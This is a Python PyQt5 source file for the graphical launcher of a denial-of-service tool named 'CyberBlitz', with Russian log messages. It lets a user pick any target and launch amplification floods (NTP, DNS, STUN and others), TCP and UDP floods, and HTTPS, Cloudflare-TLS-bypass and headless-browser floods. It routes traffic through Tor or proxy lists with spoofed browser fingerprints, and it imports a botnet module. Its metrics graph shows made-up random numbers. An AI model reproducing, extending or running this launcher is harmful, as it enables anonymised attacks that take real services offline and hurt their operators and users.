import sys
import os
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QGridLayout, QLineEdit, QPushButton, QSpinBox, QComboBox,
    QRadioButton, QCheckBox, QLabel, QPlainTextEdit, QProgressBar,
    QGroupBox, QDialog, QMessageBox, QDoubleSpinBox, QSplitter,
    QTabWidget, QStatusBar, QFileDialog
)
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtGui import QFont
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject
import plotly.graph_objects as go

# Import existing CyberBlitz modules
from config import update_config, CONFIG, setup_logging, logger
from attacks.layer4 import *
from attacks.layer7 import BrowserAttack, TLSAttack, HTTPAttack, get_locust_attack
from attacks.botnet import *
from utils.proxy import load_proxies_from_file
from gui_advanced import AdvancedSettingsDialog
from gui_dialogs import HeaderPoolsDialog, UserAgentMatrixDialog, HeaderConfigDialog
from gui_constants import ATTACK_METHODS
from gui_themes import apply_theme
import asyncio
import time
import logging
import threading
import json
import random

class GuiLogHandler(QObject, logging.Handler):
    log_signal = pyqtSignal(str, str)
    def __init__(self):
        QObject.__init__(self)
        logging.Handler.__init__(self)
        self.setLevel(logging.DEBUG)
    def emit(self, record):
        message = self.format(record)
        self.log_signal.emit(message, record.levelname)

class AttackWorker(QThread):
    progress_updated = pyqtSignal(int)
    attack_finished = pyqtSignal()
    metrics_updated = pyqtSignal(dict)
    
    def __init__(self, attack_params):
        super().__init__()
        self.attack_params = attack_params
        self.is_running = True
        self.attack_instance = None
        self.metrics = {
            'requests_per_second': 0,
            'latency': 0,
            'success_rate': 0,
            'bandwidth': 0
        }
    def run(self):
        duration = self.attack_params['duration']
        method = self.attack_params['method']
        
        advanced_settings = CONFIG.get('advanced_settings', {})
        if advanced_settings:
            browser_settings = advanced_settings.get('browser', {})
            if browser_settings:
                self.attack_params['browser_profile'] = browser_settings.get('profile', 'chrome_120')
                self.attack_params['browser_type'] = browser_settings.get('emulation', 'playwright')
                self.attack_params['browser_behaviors'] = browser_settings.get('behaviors', [])
                
        update_config(**self.attack_params)
        
        if isinstance(CONFIG.get('proxy_list'), list):
            CONFIG['proxies'] = CONFIG['proxy_list']
        
        def create_browser_attack(attack_type):
            return BrowserAttack(
                target_url=CONFIG['target_url'],
                duration=CONFIG['duration'],
                attack_type=attack_type,
                browser_type=self.attack_params.get('browser_type', 'playwright'),
                browser_profile=self.attack_params.get('browser_profile', 'chrome_120'),
                behaviors=self.attack_params.get('behaviors', [])
            )

        attack_methods = {
            'NTP': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'NTP', CONFIG['duration']),
            'STUN': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'STUN', CONFIG['duration']),
            'DNS': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'DNS', CONFIG['duration']),
            'WSD': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'WSD', CONFIG['duration']),
            'SADP': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'SADP', CONFIG['duration']),
            'TCP-SYN': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-SYN', CONFIG['duration']),
            'TCP-ACK': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-ACK', CONFIG['duration']),
            'TCP-BYPASS': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-BYPASS', CONFIG['duration']),
            'OVH-TCP': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'OVH-TCP', CONFIG['duration']),
            'UDP': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP', CONFIG['duration']),
            'UDP-VSE': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP-VSE', CONFIG['duration']),
            'UDP-BYPASS': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP-BYPASS', CONFIG['duration']),
            'HTTPS-FLOODER': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-FLOODER'),
            'HTTPS-BYPASS': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-BYPASS'),
            'HTTP-BROWSER': lambda: create_browser_attack('HTTP-BROWSER'),
            'BROWSER-STEALTH': lambda: create_browser_attack('BROWSER-STEALTH'),
            'CF-TLS': lambda: TLSAttack(CONFIG['target_url'], CONFIG['duration'], 'CF-TLS'),
            'LOCUST-HTTP': lambda: get_locust_attack()(CONFIG['target_url'], CONFIG['duration'], 'LOCUST-HTTP')
        }
        logger.info(f"Запуск {method} атаки...")
        start_time = time.time()
        try:
            self.attack_instance = attack_methods[method]()
            attack_thread = threading.Thread(target=self.run_attack_logic)
            attack_thread.start()
            while self.is_running and (time.time() - start_time < duration):
                elapsed = int(time.time() - start_time)
                self.progress_updated.emit(int((elapsed / duration) * 100))
                
                # NOTE: Emitting demonstrative metrics. Replace with real data source later.
                dummy_metrics = {
                    'requests_per_second': random.uniform(100, 500) + (elapsed % 10) * 10,
                    'latency': random.uniform(50, 150) - (elapsed % 10) * 5,
                    'success_rate': 99.0,
                    'bandwidth': random.uniform(10, 25)
                }
                self.metrics_updated.emit(dummy_metrics)
                
                time.sleep(1) # Update graph every second
            self.stop()
            attack_thread.join(timeout=5)
            self.progress_updated.emit(100)
            logger.info("Атака завершена.")
        except Exception as e:
            logger.error(f"Ошибка при выполнении атаки: {e}")
        finally:
            self.attack_finished.emit()
            
    def run_attack_logic(self):
        try:
            if asyncio.iscoroutinefunction(self.attack_instance.run):
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(self.attack_instance.run())
            else:
                self.attack_instance.run()
        except Exception as e:
            logger.error(f"Ошибка в потоке атаки: {e}")
            
    def stop(self):
        if not self.is_running: return
        self.is_running = False
        if self.attack_instance and hasattr(self.attack_instance, 'stop'):
            if asyncio.iscoroutinefunction(self.attack_instance.stop):
                asyncio.run(self.attack_instance.stop())
            else:
                self.attack_instance.stop()
        self.wait()

class CyberBlitzGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CyberBlitz")
        self.setGeometry(100, 100, 850, 750)
        
        self.advanced_settings = None
        self.attack_thread = None
        self.gui_log_handler = GuiLogHandler()
        self.loaded_proxies = []

        # For graph
        self.time_points = []
        self.rps_points = []
        self.latency_points = []
        self.success_points = []
        self.bandwidth_points = []
        
        self.init_ui()
        self.setup_logging()
        self.update_method_options()
        self.toggle_browser_options()

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        # --- Tab Widget ---
        tab_widget = QTabWidget()
        attack_tab = self.create_attack_tab()
        network_tab = self.create_network_tab()
        graph_tab = self.create_graph_tab()
        advanced_tab = self.create_advanced_tab()
        
        tab_widget.addTab(attack_tab, "Атака")
        tab_widget.addTab(network_tab, "Сеть и Спуфинг")
        tab_widget.addTab(graph_tab, "График")
        tab_widget.addTab(advanced_tab, "Дополнительно")
        
        main_layout.addWidget(tab_widget)

        # --- Logs and Console ---
        splitter = QSplitter(Qt.Vertical)
        self.log_output = QPlainTextEdit()
        self.log_output.setReadOnly(True)
        splitter.addWidget(self.log_output)

        self.debug_console_group = QGroupBox("Debug Console")
        debug_layout = QVBoxLayout(self.debug_console_group)
        self.debug_console = QPlainTextEdit()
        self.debug_console.setReadOnly(True)
        debug_layout.addWidget(self.debug_console)
        splitter.addWidget(self.debug_console_group)
        self.debug_console_group.setVisible(False)
        
        splitter.setSizes([400, 200])
        main_layout.addWidget(splitter)

        # --- Bottom Panel ---
        bottom_layout = QHBoxLayout()
        self.progress_bar = QProgressBar()
        self.progress_bar.setTextVisible(True)
        bottom_layout.addWidget(self.progress_bar)
        
        self.show_console_checkbox = QCheckBox("Show Debug Console")
        self.show_console_checkbox.toggled.connect(self.toggle_debug_console)
        bottom_layout.addWidget(self.show_console_checkbox)
        
        self.log_to_file_checkbox = QCheckBox("Log to file")
        self.log_to_file_checkbox.setChecked(True)
        bottom_layout.addWidget(self.log_to_file_checkbox)
        
        main_layout.addLayout(bottom_layout)

        # --- Control Buttons ---
        button_layout = QHBoxLayout()
        button_layout.addStretch()
        
        self.stop_button = QPushButton("STOP")
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setObjectName("stopButton")
        button_layout.addWidget(self.stop_button)
        
        self.start_button = QPushButton("START")
        self.start_button.clicked.connect(self.start_attack)
        self.start_button.setObjectName("startButton")
        button_layout.addWidget(self.start_button)
        
        main_layout.addLayout(button_layout)
        
        # --- Status Bar ---
        self.setStatusBar(QStatusBar(self))
        self.statusBar().showMessage("Готов к работе.")

    def create_attack_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setAlignment(Qt.AlignTop)

        params_group = QGroupBox("Основные параметры")
        params_layout = QGridLayout(params_group)

        params_layout.addWidget(QLabel("Target:"), 0, 0)
        self.target_input = QLineEdit("127.0.0.1")
        params_layout.addWidget(self.target_input, 0, 1, 1, 3)

        params_layout.addWidget(QLabel("Port:"), 0, 4)
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(80)
        params_layout.addWidget(self.port_input, 0, 5)

        params_layout.addWidget(QLabel("Layer:"), 1, 0)
        self.l4_radio = QRadioButton("L4")
        self.l4_radio.setChecked(True)
        self.l7_radio = QRadioButton("L7")
        self.l4_radio.toggled.connect(self.update_method_options)
        self.l7_radio.toggled.connect(self.update_method_options)
        layer_layout = QHBoxLayout()
        layer_layout.addWidget(self.l4_radio)
        layer_layout.addWidget(self.l7_radio)
        layer_layout.addStretch()
        params_layout.addLayout(layer_layout, 1, 1)

        params_layout.addWidget(QLabel("Method:"), 2, 0)
        self.method_combo = QComboBox()
        self.method_combo.currentIndexChanged.connect(self.toggle_browser_options)
        params_layout.addWidget(self.method_combo, 2, 1, 1, 3)

        params_layout.addWidget(QLabel("Threads:"), 3, 0)
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 1000)
        self.threads_input.setValue(100)
        params_layout.addWidget(self.threads_input, 3, 1)

        params_layout.addWidget(QLabel("Duration (s):"), 3, 2)
        self.duration_input = QSpinBox()
        self.duration_input.setRange(1, 3600)
        self.duration_input.setValue(60)
        params_layout.addWidget(self.duration_input, 3, 3)
        
        layout.addWidget(params_group)
        return tab

    def create_network_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setAlignment(Qt.AlignTop)

        client_group = QGroupBox("Client Spoofing")
        client_layout = QGridLayout(client_group)

        client_layout.addWidget(QLabel("TLS Client (for CF-TLS):"), 0, 0)
        self.tls_client_combo = QComboBox()
        self.tls_client_combo.addItems(["chrome_120", "chrome_117", "firefox_118", "safari_16_5", "okhttp4_android_11"])
        client_layout.addWidget(self.tls_client_combo, 0, 1)

        self.browser_label = QLabel("Browser (for HTTP-BROWSER):")
        client_layout.addWidget(self.browser_label, 1, 0)
        self.browser_combo = QComboBox()
        self.browser_combo.addItems(["playwright", "selenium"])
        client_layout.addWidget(self.browser_combo, 1, 1)

        self.clicks_checkbox = QCheckBox("Clicks")
        client_layout.addWidget(self.clicks_checkbox, 2, 0)
        self.scroll_checkbox = QCheckBox("Scroll")
        client_layout.addWidget(self.scroll_checkbox, 2, 1)

        client_layout.addWidget(QLabel("Delay (s):"), 3, 0)
        self.delay_input = QDoubleSpinBox()
        self.delay_input.setRange(0.0, 10.0)
        self.delay_input.setValue(1.0)
        client_layout.addWidget(self.delay_input, 3, 1)
        
        layout.addWidget(client_group)

        anon_group = QGroupBox("Anonymity & Routing")
        anon_layout = QGridLayout(anon_group)

        self.use_tor_checkbox = QCheckBox("Use Tor")
        anon_layout.addWidget(self.use_tor_checkbox, 0, 0)
        
        self.tor_lib_combo = QComboBox()
        self.tor_lib_combo.addItems(["torpy", "torsocks"])
        self.tor_lib_combo.setEnabled(False)
        self.use_tor_checkbox.toggled.connect(self.tor_lib_combo.setEnabled)
        anon_layout.addWidget(self.tor_lib_combo, 0, 1)

        self.use_proxy_checkbox = QCheckBox("Use Proxy")
        anon_layout.addWidget(self.use_proxy_checkbox, 1, 0)
        
        self.proxy_type_combo = QComboBox()
        self.proxy_type_combo.addItems(["http", "https", "socks4", "socks5"])
        self.proxy_type_combo.setEnabled(False)
        self.use_proxy_checkbox.toggled.connect(self.proxy_type_combo.setEnabled)
        anon_layout.addWidget(self.proxy_type_combo, 1, 1)

        self.proxy_input = QLineEdit()
        self.proxy_input.setPlaceholderText("Enter custom proxy or load from file")
        self.proxy_input.setEnabled(False)
        self.use_proxy_checkbox.toggled.connect(self.proxy_input.setEnabled)
        anon_layout.addWidget(self.proxy_input, 2, 0, 1, 2)

        self.load_proxy_button = QPushButton("Load from File")
        self.load_proxy_button.setEnabled(False)
        self.use_proxy_checkbox.toggled.connect(self.load_proxy_button.setEnabled)
        self.load_proxy_button.clicked.connect(self.handle_load_proxies)
        anon_layout.addWidget(self.load_proxy_button, 3, 0, 1, 2)
        
        layout.addWidget(anon_group)
        return tab

    def create_advanced_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(15)
        layout.setAlignment(Qt.AlignTop)
        
        adv_group = QGroupBox("Configuration Dialogs")
        adv_layout = QVBoxLayout(adv_group)
        
        self.advanced_settings_button = QPushButton("ADVANCED SETTINGS")
        self.advanced_settings_button.clicked.connect(self.show_advanced_settings)
        adv_layout.addWidget(self.advanced_settings_button)

        self.config_pools_button = QPushButton("CONFIGURE HEADER POOLS")
        self.config_pools_button.clicked.connect(self.open_header_pools_dialog)
        adv_layout.addWidget(self.config_pools_button)
        
        self.config_ua_matrix_button = QPushButton("CONFIGURE USER-AGENT MATRIX")
        self.config_ua_matrix_button.clicked.connect(self.open_ua_matrix_dialog)
        adv_layout.addWidget(self.config_ua_matrix_button)
        
        layout.addWidget(adv_group)
        return tab

    def create_graph_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        self.graph_view = QWebEngineView()
        layout.addWidget(self.graph_view)
        self.update_graph() # Initial empty graph
        return tab

    def update_graph(self, metrics=None):
        if metrics:
            current_time = len(self.time_points)
            self.time_points.append(current_time)
            self.rps_points.append(metrics.get('requests_per_second', 0))
            self.latency_points.append(metrics.get('latency', 0))
            self.success_points.append(metrics.get('success_rate', 0))
            self.bandwidth_points.append(metrics.get('bandwidth', 0))

        html = self.generate_graph_html()
        self.graph_view.setHtml(html)

    def generate_graph_html(self):
        fig = go.Figure()

        fig.add_trace(go.Scatter(x=self.time_points, y=self.rps_points, mode='lines+markers', name='Requests/sec'))
        fig.add_trace(go.Scatter(x=self.time_points, y=self.latency_points, mode='lines+markers', name='Latency (ms)', yaxis='y2'))

        fig.update_layout(
            title='Real-Time Attack Metrics',
            xaxis_title='Time (s)',
            yaxis=dict(
                title=dict(text='Requests/sec', font=dict(color='#1f77b4')),
                tickfont=dict(color='#1f77b4')
            ),
            yaxis2=dict(
                title=dict(text='Latency (ms)', font=dict(color='#ff7f0e')),
                tickfont=dict(color='#ff7f0e'),
                overlaying='y',
                side='right'
            ),
            template='plotly_dark',
            legend=dict(orientation="h", yanchor="bottom", y=1.02, xanchor="right", x=1)
        )
        return fig.to_html(full_html=False, include_plotlyjs='cdn')

    def handle_load_proxies(self):
        options = QFileDialog.Options()
        filePath, _ = QFileDialog.getOpenFileName(self, "Open Proxy File", "", "Text Files (*.txt);;All Files (*)", options=options)
        if filePath:
            proxy_type = self.proxy_type_combo.currentText()
            self.loaded_proxies = load_proxies_from_file(filePath, proxy_type)
            if self.loaded_proxies:
                self.proxy_input.setText(f"Loaded {len(self.loaded_proxies)} proxies from file.")
                self.proxy_input.setReadOnly(True)
                self.use_proxy_checkbox.setChecked(True)
                logger.info(f"Successfully loaded {len(self.loaded_proxies)} proxies.")
            else:
                self.proxy_input.setText("Failed to load proxies or file is empty.")
                self.proxy_input.setReadOnly(False)

    def setup_logging(self):
        self.gui_log_handler.log_signal.connect(self.handle_log_message)
        log_level = logging.DEBUG if self.show_console_checkbox.isChecked() else logging.INFO
        file_logging = self.log_to_file_checkbox.isChecked()
        setup_logging(level=log_level, console=False, file_logging=file_logging)
        if self.gui_log_handler not in logging.getLogger().handlers:
            logging.getLogger().addHandler(self.gui_log_handler)

    def toggle_debug_console(self, checked):
        self.debug_console_group.setVisible(checked)
        self.setup_logging()
        
    def update_metrics(self, metrics):
        if metrics and CONFIG.get('advanced_settings', {}).get('monitoring', {}).get('metrics'):
            monitoring_settings = CONFIG['advanced_settings']['monitoring']
            if 'metrics' in monitoring_settings:
                for metric in monitoring_settings['metrics']:
                    if metric in metrics:
                        self.debug_console.appendPlainText(f"{metric}: {metrics[metric]}")
                        
            if 'export_format' in monitoring_settings:
                self.export_metrics(metrics, monitoring_settings['export_format'])
                
    def export_metrics(self, metrics, format_type):
        try:
            from utils.metrics_export import export_metrics_to_file
            filename = export_metrics_to_file(metrics, format_type)
            logger.info(f"Metrics exported to {filename}")
        except Exception as e:
            logger.error(f"Failed to export metrics: {e}")
            
    def update_method_options(self, custom_methods=None):
        self.method_combo.clear()
        
        if isinstance(custom_methods, (list, tuple)) and custom_methods:
            self.method_combo.addItems(custom_methods)
        else:
            layer = 'L4' if self.l4_radio.isChecked() else 'L7'
            methods = []
            for category, attacks in ATTACK_METHODS[layer].items():
                methods.extend(attacks)
            self.method_combo.addItems(methods)

    def toggle_browser_options(self):
        method = self.method_combo.currentText()
        is_browser_method = method in ['HTTP-BROWSER', 'BROWSER-STEALTH']
        
        self.browser_label.setVisible(is_browser_method)
        self.browser_combo.setVisible(is_browser_method)
        self.clicks_checkbox.setVisible(is_browser_method)
        self.scroll_checkbox.setVisible(is_browser_method)
        
        if is_browser_method:
            advanced_settings = CONFIG.get('advanced_settings', {})
            if advanced_settings and 'browser' in advanced_settings:
                browser_settings = advanced_settings['browser']
                if browser_settings.get('profile'):
                    self.browser_combo.setCurrentText(browser_settings['profile'])
        
    def show_advanced_settings(self):
        if not self.advanced_settings:
            self.advanced_settings = AdvancedSettingsDialog(self)
        if self.advanced_settings.exec_() == QDialog.Accepted:
            settings = self.advanced_settings.get_all_settings()
            self.apply_advanced_settings(settings)
            
    def apply_advanced_settings(self, settings):
        attack_methods = settings.get('attack_methods', [])
        if attack_methods:
            current_layer = 'L4' if self.l4_radio.isChecked() else 'L7'
            layer_methods = []
            for category, methods in ATTACK_METHODS[current_layer].items():
                layer_methods.extend(methods)
            selected_methods = [method for method in attack_methods if method in layer_methods]
            if selected_methods:
                self.update_method_options(selected_methods)
            
        browser_settings = settings.get('browser', {})
        if browser_settings.get('emulation') and browser_settings['emulation'] != 'none':
            self.browser_combo.setCurrentText(browser_settings['emulation'])
        if 'clicks' in browser_settings.get('behaviors', []):
            self.clicks_checkbox.setChecked(True)
        if 'scroll' in browser_settings.get('behaviors', []):
            self.scroll_checkbox.setChecked(True)
            
        proxy_settings = settings.get('proxy', {})
        if proxy_settings.get('type'):
            self.proxy_type_combo.setCurrentText(proxy_settings['type'])
            self.use_proxy_checkbox.setChecked(True)
            
        tls_settings = settings.get('tls', {})
        if tls_settings.get('fingerprint'):
            self.tls_client_combo.setCurrentText(tls_settings['fingerprint'])
            
        CONFIG.update({'advanced_settings': settings})
            
    def start_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            QMessageBox.warning(self, "Внимание", "Атака уже запущена.")
            return

        method = self.method_combo.currentText()
        is_l4_attack = False
        for category, methods in ATTACK_METHODS['L4'].items():
            if method in methods:
                is_l4_attack = True
                break
        
        # Проверка прав для L4 атак на системах, отличных от Windows
        if is_l4_attack and hasattr(os, 'geteuid') and os.geteuid() != 0:
            QMessageBox.critical(self, "Ошибка прав доступа",
                                 "Атаки 4-го уровня (L4) требуют прав суперпользователя.\n"
                                 "Пожалуйста, перезапустите приложение с помощью 'sudo'.")
            return

        if method == 'LOCUST-HTTP':
            import gevent.monkey
            gevent.monkey.patch_all()
            from fake_useragent import settings
            settings.VERIFY_SSL = False
            
        advanced_settings = CONFIG.get('advanced_settings', {})
        
        proxy_list_or_str = self.loaded_proxies if self.loaded_proxies else self.proxy_input.text()

        attack_params = {
            'target_ip': self.target_input.text(),
            'target_url': self.target_input.text(),
            'port': self.port_input.value(),
            'method': method,
            'threads': self.threads_input.value(),
            'duration': self.duration_input.value(),
            'use_tor': self.use_tor_checkbox.isChecked(),
            'tor_library': self.tor_lib_combo.currentText() if self.use_tor_checkbox.isChecked() else None,
            'use_proxy': self.use_proxy_checkbox.isChecked(),
            'proxy_type': self.proxy_type_combo.currentText() if self.use_proxy_checkbox.isChecked() else None,
            'proxy_list': proxy_list_or_str,
            'tls_client_identifier': self.tls_client_combo.currentText(),
            'delay': self.delay_input.value(),
        }
        
        if self.method_combo.currentText() in ['HTTP-BROWSER', 'BROWSER-STEALTH']:
            browser_settings = advanced_settings.get('browser', {})
            attack_params.update({
                'browser_type': browser_settings.get('emulation', 'playwright'),
                'browser_profile': browser_settings.get('profile', 'chrome_120'),
                'behaviors': browser_settings.get('behaviors', []),
                'clicks': self.clicks_checkbox.isChecked(),
                'scroll': self.scroll_checkbox.isChecked(),
            })
        
        self.setup_logging()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)
        self.log_output.clear()
        self.debug_console.clear()

        # Clear previous graph data
        self.time_points.clear()
        self.rps_points.clear()
        self.latency_points.clear()
        self.success_points.clear()
        self.bandwidth_points.clear()
        self.update_graph()
        
        self.attack_thread = AttackWorker(attack_params)
        self.attack_thread.progress_updated.connect(self.progress_bar.setValue)
        self.attack_thread.attack_finished.connect(self.on_attack_finished)
        self.attack_thread.metrics_updated.connect(self.update_graph)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
        else:
            QMessageBox.warning(self, "Внимание", "Атака не запущена.")
            
    def on_attack_finished(self):
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        if self.progress_bar.value() < 100: self.progress_bar.setValue(100)
        self.attack_thread = None
        
    def handle_log_message(self, message, level):
        target_console = self.debug_console if level == "DEBUG" else self.log_output
        color = {"DEBUG": "#A0A0A0", "INFO": "#ECECEC", "WARNING": "#FFFF00", "ERROR": "#FF5252", "CRITICAL": "#FF5252"}.get(level, "#ECECEC")
        formatted_message = f'<font color="{color}">{message.strip()}</font>'
        target_console.appendHtml(formatted_message)
        target_console.ensureCursorVisible()
        
    def open_ua_matrix_dialog(self):
        dialog = UserAgentMatrixDialog(self)
        dialog.exec_()
        
    def open_header_pools_dialog(self):
        header_config = HeaderConfigDialog(self)
        if header_config.exec_() == QDialog.Accepted:
            pools_dialog = HeaderPoolsDialog(self)
            pools_dialog.exec_()

    def closeEvent(self, event):
        if self.attack_thread and self.attack_thread.isRunning():
            self.stop_attack()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    apply_theme(app)
    window = CyberBlitzGUI()
    window.show()
    sys.exit(app.exec_())
